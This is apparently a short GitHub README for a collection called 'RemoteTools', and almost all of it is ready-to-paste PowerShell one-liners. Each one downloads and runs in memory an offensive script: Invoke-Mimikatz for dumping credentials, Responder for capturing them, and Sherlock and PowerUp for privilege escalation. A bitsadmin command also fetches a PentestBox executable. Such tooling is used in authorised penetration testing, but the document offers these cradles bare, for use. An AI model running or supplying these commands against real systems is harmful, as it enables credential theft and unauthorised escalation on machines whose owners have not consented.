# RemoteTools

## These are configured to be run via powershell remotely.  

### Credit to the original authors 

### Mimikatz

IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Invoke-Mimikatz.ps1')  

### Responder

IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Responder.ps1')  

### Sherlock

IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Sherlock.ps1')

### Powerup

IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/PowerUp.ps1')

### PentestBox.exe
bitsadmin /transfer myjob /download /priority high https://downloads.sourceforge.net/project/pentestbox/PentestBox-2.3.exe?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fpentestbox%2Ffiles%2FPentestBox-2.3.exe%2Fdownload&ts=1544017599 C:\temp\pentestbox.exe
